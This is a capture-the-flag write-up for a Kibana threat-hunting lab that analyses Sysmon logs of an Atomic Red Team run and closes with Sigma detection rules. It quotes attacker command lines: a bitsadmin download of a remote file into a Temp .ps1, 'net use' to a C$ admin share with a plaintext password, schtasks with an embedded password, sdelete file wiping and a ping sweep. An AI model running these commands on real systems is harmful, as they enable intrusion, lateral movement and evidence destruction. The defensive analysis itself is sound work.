# Kibana : Windows Event Logs I — Complete Walkthrough & Threat Hunting Analysis

> **Platform:** INE Security / PentesterAcademy (AttackDefense)
>
> **Challenge ID:** [cid=1182](https://attackdefense.com/challengedetails?cid=1182)
>
> **Category:** Log Analysis & Threat Hunting: Windows Event Logs
>
> **Dataset Source:** [`PanacheSysmon_vs_AtomicRedTeam01.evtx`](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx) (by Samir Bousseaden)
>
> **Status:** 5 of 5 Flags Captured (100% Solved)

---

<div align="center">

![Kibana Windows Event Logs Analysis Banner](./images/kibana_event_logs_banner.jpg)

# 🔍 Kibana: Windows Event Logs I 🔍
### SOC Threat Hunting & Forensic Analysis of Red Canary Atomic Red Team Execution

[![Lab](https://img.shields.io/badge/Platform-AttackDefense%20%2F%20INE-red?style=for-the-badge&logo=target)](https://attackdefense.com/challengedetails?cid=1182)
[![Engine](https://img.shields.io/badge/SIEM-Elastic%20Kibana%20%26%20Elasticsearch-005571?style=for-the-badge&logo=elastic)](https://www.elastic.co/)
[![Telemetry](https://img.shields.io/badge/Logs-Microsoft%20Sysmon%20EID%201-0078D4?style=for-the-badge&logo=windows)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-orange?style=for-the-badge&logo=hackthebox)](https://attack.mitre.org/)

</div>

---

### 💻 Real-Time Investigation Demonstration

The animated demonstration below showcases the complete Kibana threat hunting workflow—filtering event data across `EventData.CommandLine`, isolating Atomic Red Team telemetry, extracting credentials from command-line arguments, identifying network sweeps, and capturing all 5 flags:

![Kibana Windows Event Log Threat Hunting Live Demo](./images/kibana_investigation_live_demo.gif)

---

# Executive Summary

In modern enterprise security operations, endpoint telemetry is the gold standard for detecting post-exploitation activity. Adversaries frequently rely on built-in administrative tools and Living Off the Land Binaries (LOLBAS) to establish persistence, move laterally, conduct reconnaissance, and transfer tools.

This lab simulates an incident investigation where an endpoint was subjected to automated adversary emulation using **Red Canary's Atomic Red Team** framework. Telemetry was ingested via **Microsoft Sysmon (System Monitor)** into an **Elasticsearch & Kibana (ELK)** stack.

As SOC analysts and threat hunters, our objective is to analyze the Windows event logs using the Kibana Discover interface, identify attacker commands, extract operational artifacts, and capture all five flags.

---

# 5-Stage Threat Hunting Workflow

The investigation follows the structured methodology below:

![5-Stage Threat Hunting Workflow in Kibana](./images/kibana_investigation_process_map.jpg)

```mermaid
flowchart TD
    Ingest["1. Elasticsearch Ingestion\n(PanacheSysmon_vs_AtomicRedTeam01.evtx)"]
    --> Discover["2. Kibana Discover View\n(Time Filter: Jul 19, 2019 @ 20:11 - 20:43)"]
    
    Discover --> Q1["Stage 1: Persistence\nQuery: EventData.CommandLine : 'schtasks'\n-> Extract /RP User Password"]
    Discover --> Q2["Stage 2: Defense Evasion\nQuery: EventData.CommandLine : sdelete*\n-> Extract Deleted File Path"]
    Discover --> Q3["Stage 3: Lateral Movement\nQuery: EventData.CommandLine : 'net use'\n-> Extract Remote SMB Password"]
    Discover --> Q4["Stage 4: Network Reconnaissance\nQuery: EventData.CommandLine : 'ping'\n-> Identify Ping Sweep CIDR Subnet"]
    Discover --> Q5["Stage 5: Ingress Tool Transfer\nQuery: EventData.CommandLine : bitsadmin*\n-> Extract BITS Download Destination"]
    
    Q1 --> Flags["3. All 5 Flags Captured (100% Complete)"]
    Q2 --> Flags
    Q3 --> Flags
    Q4 --> Flags
    Q5 --> Flags

    style Ingest fill:#1e293b,stroke:#3b82f6,color:#fff
    style Discover fill:#1e293b,stroke:#8b5cf6,color:#fff
    style Q1 fill:#1e293b,stroke:#06b6d4,color:#fff
    style Q2 fill:#1e293b,stroke:#f59e0b,color:#fff
    style Q3 fill:#1e293b,stroke:#ef4444,color:#fff
    style Q4 fill:#1e293b,stroke:#a855f7,color:#fff
    style Q5 fill:#1e293b,stroke:#10b981,color:#fff
    style Flags fill:#0f172a,stroke:#10b981,stroke-width:2px,color:#fff
```

---

# 🚩 Flag Capture Summary Matrix

| # | Investigation Objective | MITRE ATT&CK Technique | Kibana Search Filter | Captured Flag / Answer |
| :---: | :--- | :--- | :--- | :--- |
| **Q1** | Scheduled Task User Password | **T1053.005** (Scheduled Task) | `EventData.CommandLine : "schtasks"` | `At0micStrong` |
| **Q2** | Securely Deleted File Path | **T1070.004** (File Deletion) | `EventData.CommandLine : sdelete*` | `C:\some\file.txt` |
| **Q3** | Remote SMB Administrator Password | **T1021.002** (SMB Admin Shares) | `EventData.CommandLine : "net use"` | `P@ssw0rd1` |
| **Q4** | Ping Sweep Target Subnet | **T1018** (Remote System Discovery) | `EventData.CommandLine : "ping"` | `192.168.1.0/24` |
| **Q5** | BITSAdmin Downloaded File Path | **T1197** (BITS Jobs) / **T1105** | `EventData.CommandLine : bitsadmin*` | `C:\Windows\Temp\bitsadmin_flag.ps1` |

---

# Detailed Step-by-Step Walkthrough

## Setup & Time-Window Configuration

Upon accessing the Kibana dashboard:
1. Navigate to the **Discover** tab in the left-hand navigation pane.
2. Confirm the selected index pattern corresponds to the ingested Windows Sysmon logs (`winlogbeat-*` or similar).
3. Set the global time filter in the upper-right corner to encompass the attack simulation:
   - **Start Time:** `Jul 19, 2019 @ 20:11:35.076`
   - **End Time:** `Jul 19, 2019 @ 20:43:23.272`
4. In the document field list on the left, add **`EventData.CommandLine`** as a visible column to streamline log inspection.

---

## 🚩 Question 1: Scheduled Task Password

### Objective
> *A task was scheduled to run daily at a specific time. Provide the password of the user running that task.*

### Threat Hunting Query
In the Kibana KQL search bar, execute:

```text
EventData.CommandLine : "schtasks"
```

### Log Analysis
Kibana returns **4 hits** matching this query. Inspecting the event logs recorded at `Jul 19, 2019 @ 20:27:46.000`:

```text
Log 1: 'C:\Windows\system32\cmd.exe' /c 'SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10'
Log 2: SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
Log 3: 'C:\Windows\system32\cmd.exe' /c 'SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ' Atomic 'task /TR C:\windows\system32\cmd.exe /SC daily /ST 20:10'
Log 4: SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ' Atomic 'task /TR C:\windows\system32\cmd.exe /SC daily /ST 20:10
```

### Forensic Dissection
Log #4 demonstrates an adversary creating a persistent task configured to execute **daily**:

```cmd
SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ' Atomic 'task /TR C:\windows\system32\cmd.exe /SC daily /ST 20:10
```

* **`/Create`**: Instructs the Task Scheduler service to create a new task.
* **`/S localhost`**: Specifies the local target machine.
* **`/RU DOMAIN\user`**: Specifies the Run As User context under which the task executes.
* **`/RP At0micStrong`**: **The Run As Password parameter.** Passing `/RP` on the CLI forces the plaintext password into the process command line.
* **`/TN ' Atomic 'task`**: Task Name.
* **`/TR C:\windows\system32\cmd.exe`**: Task Run command (Action).
* **`/SC daily`**: Schedule frequency configured to run **daily**.
* **`/ST 20:10`**: Start time set to 20:10 (8:10 PM).

### Answer / Flag
```text
At0micStrong
```

> [!CAUTION]
> **Security Implication (CWE-214):** Passing credentials via command-line arguments (`/RP <password>`) exposes secrets in plaintext across process creation logs (Sysmon EID 1, Windows EID 4688) and process listings accessible by any unprivileged user on the host.

---

## 🚩 Question 2: Securely Deleted File Path

### Objective
> *A .txt file had been deleted securely using the 'sdelete' utility. Provide the full path of that file.*

### Threat Hunting Query
In the Kibana search bar, filter for executions of Microsoft Sysinternals `sdelete`:

```text
EventData.CommandLine : sdelete*
```

### Log Analysis
Kibana returns **1 hit** recorded at `Jul 19, 2019 @ 20:17:57.000`:

```text
Time                     : Jul 19, 2019 @ 20:17:57.000
EventData.Image          : C:\Windows\System32\cmd.exe
EventData.CommandLine    : 'C:\Windows\system32\cmd.exe' /c 'sdelete.exe C:\some\file.txt'
EventData.ParentImage    : C:\Windows\System32\cmd.exe
```

### Forensic Dissection
The adversary executed Microsoft Sysinternals `sdelete.exe` via `cmd.exe`:

```cmd
sdelete.exe C:\some\file.txt
```

* **What is SDelete?** SDelete (Secure Delete) is an advanced command-line utility designed to overwrite file data and clean free disk space in compliance with the DoD 5220.22-M clearing standard.
* **Adversary Motivation:** Threat actors abuse `sdelete.exe` as a defense evasion technique (**MITRE ATT&CK T1070.004 - File Deletion**) to permanently erase staged tools, scripts, and exfiltration archives, thwarting forensic file recovery by carving tools.

### Answer / Flag
```text
C:\some\file.txt
```

---

## 🚩 Question 3: Remote SMB Administrator Password

### Objective
> *The host machine connected to a shared resource on a remote machine, as Administrator user using the 'net use' command. Provide the password used to connect to that remote machine.*

### Threat Hunting Query
Filter for the built-in Windows network connection utility `net use`:

```text
EventData.CommandLine : "net use"
```

### Log Analysis
Kibana returns **3 hits** recorded at `Jul 19, 2019 @ 20:18:41.000`:

```text
Log 1: 'C:\Windows\system32\cmd.exe' /c 'cmd.exe /c net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator'
Log 2: cmd.exe /c net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
Log 3: net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
```

### Forensic Dissection
Log #3 shows the exact command invoked:

```cmd
net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
```

* **`net use`**: Standard Windows command used to connect a computer to, or disconnect from, a shared network resource.
* **`\\Target\C$`**: Targets the administrative default drive share (`C$`) on a remote machine named `Target`. Administrative shares are frequently abused for lateral movement.
* **`P@ssw0rd1`**: The plaintext password provided for authentication.
* **`/u:DOMAIN\Administrator`**: The username context specified for authentication.

### Answer / Flag
```text
P@ssw0rd1
```

> [!NOTE]
> **MITRE ATT&CK Mapping (T1021.002):** Adversaries use `net use` with explicit administrative credentials to mount administrative shares (`C$`, `ADMIN$`, `IPC$`) before staging malware or executing remote services via PsExec or WMI.

---

## 🚩 Question 4: Ping Sweep Subnet Address (CIDR)

### Objective
> *A ping sweep attack had been launched by the host machine against a network. What was the subnet address of that network? Provide the answer in CIDR notation.*

### Threat Hunting Query
Filter for `ping` execution:

```text
EventData.CommandLine : "ping"
```

### Log Analysis
Kibana returns **255 hits**. Reviewing the earliest timestamp (`Jul 19, 2019 @ 20:21:35.000`) reveals the parent execution command that spawned the rapid flurry of ping processes:

```text
Time                     : Jul 19, 2019 @ 20:21:35.000
EventData.CommandLine    : 'C:\Windows\system32\cmd.exe' /c 'for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i'
```

Immediately following this parent command, 254 distinct child processes are spawned in sequential order:
- `ping -n 1 -w 100 192.168.1.1`
- `ping -n 1 -w 100 192.168.1.2`
- `...`
- `ping -n 1 -w 100 192.168.1.254`

### Forensic Dissection
The command employs an arithmetic `for /l` loop native to Windows Command Prompt:

```cmd
for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
```

* **`for /l %i in (start,step,end)`**: Loops through numbers starting at `1`, stepping by `1`, ending at `254`.
* **`-n 1`**: Sends exactly 1 ICMP Echo Request per IP.
* **`-w 100`**: Sets the timeout to 100 milliseconds to accelerate the scan.
* **`192.168.1.%i`**: Iterates through the entire host range `192.168.1.1` to `192.168.1.254`.
* **Subnet Representation:** The target range encompasses the 24-bit subnet starting at `192.168.1.0` with subnet mask `255.255.255.0`, which corresponds to **`192.168.1.0/24`** in CIDR notation.

### Answer / Flag
```text
192.168.1.0/24
```

---

## 🚩 Question 5: BITSAdmin Downloaded File Path

### Objective
> *Bitsadmin tool was used to download a file from a remote server. Provide the full path of the downloaded file on the host machine.*

### Threat Hunting Query
Filter for executions of the BITSAdmin management utility:

```text
EventData.CommandLine : bitsadmin*
```

### Log Analysis
Kibana returns **12 hits**. Inspecting the command recorded at `Jul 19, 2019 @ 20:18:01.000`:

```text
Time                     : Jul 19, 2019 @ 20:18:01.000
EventData.Image          : C:\Windows\System32\bitsadmin.exe
EventData.CommandLine    : bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1
```

### Forensic Dissection
The adversary abused `bitsadmin.exe` as a Living Off the Land binary (LOLBAS) to stage malicious payloads:

```cmd
bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1
```

* **`bitsadmin.exe`**: Built-in Windows tool for managing Background Intelligent Transfer Service (BITS) jobs.
* **`/transfer`**: Creates a single-job download transfer.
* **`/Download`**: Specifies the transfer direction as download.
* **`/priority Foreground`**: Forces the transfer into foreground priority to execute immediately rather than idling in the background.
* **Source URL**: `https://raw.githubusercontent.com/.../T1197.md`
* **Destination Path**: The file was saved directly into the Windows temporary folder as **`C:\Windows\Temp\bitsadmin_flag.ps1`**.

### Answer / Flag
```text
C:\Windows\Temp\bitsadmin_flag.ps1
```

---

# 🛡️ Detection Engineering & Defensive Hardening

As Blue Team defenders and SOC engineers, we can translate these findings into proactive detection rules and hardening policies:

### 1. Sigma Detection Rule: Credential Exposure in `schtasks`
```yaml
title: Plaintext Password Supplied in Schtasks Command Line
id: 9b2d8611-37f0-464a-93be-12a8397a0641
status: experimental
description: Detects scheduled task creation with plaintext password supplied via /RP parameter.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains:
            - '/create'
            - '/rp'
    condition: selection
level: high
tags:
    - attack.persistence
    - attack.t1053.005
```

### 2. Sigma Detection Rule: BITSAdmin Download Transfer
```yaml
title: Ingress File Download via BITSAdmin
id: 1197cb31-8601-49fa-9481-9b19e99217e9
status: test
description: Detects the use of bitsadmin.exe to download files from remote servers.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\bitsadmin.exe'
        CommandLine|contains:
            - '/transfer'
            - '/download'
    condition: selection
level: medium
tags:
    - attack.defense_evasion
    - attack.persistence
    - attack.t1197
    - attack.t1105
```

### 3. Recommended Endpoint Hardening Measures
* **Audit Process Creation Command Lines:** Ensure Windows Security Event ID **4688** is enabled with **"Include command line in process creation events"** via Group Policy (`Computer Configuration -> Policies -> Administrative Templates -> System -> Audit Process Creation`).
* **Deploy Sysmon:** Maintain comprehensive Sysmon logging (specifically Event ID 1 for Process Creation and Event ID 3 for Network Connections).
* **Deprecate `bitsadmin.exe`:** Microsoft officially deprecated the `bitsadmin` command-line tool. Restrict its execution via Application Control policies (AppLocker / Windows Defender Application Control) and encourage legitimate administrators to use PowerShell's `Start-BitsTransfer` cmdlet.
* **Block SMB Outbound at Host Firewalls:** Block outbound port 445 traffic between internal workstations to prevent lateral movement via administrative shares (`C$`, `ADMIN$`).

---

# 📚 References
* [AttackDefense Lab: Kibana Windows Event Logs I](https://attackdefense.com/challengedetails?cid=1182)
* [Samir Bousseaden EVTX-ATTACK-SAMPLES Repository](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES)
* [Red Canary Atomic Red Team: T1053.005 Scheduled Tasks](https://atomicredteam.io/execution/T1053.005/)
* [Red Canary Atomic Red Team: T1197 BITS Jobs](https://atomicredteam.io/defense-evasion/T1197/)
* [Elasticsearch & Kibana Official Documentation](https://www.elastic.co/guide/en/kibana/current/index.html)
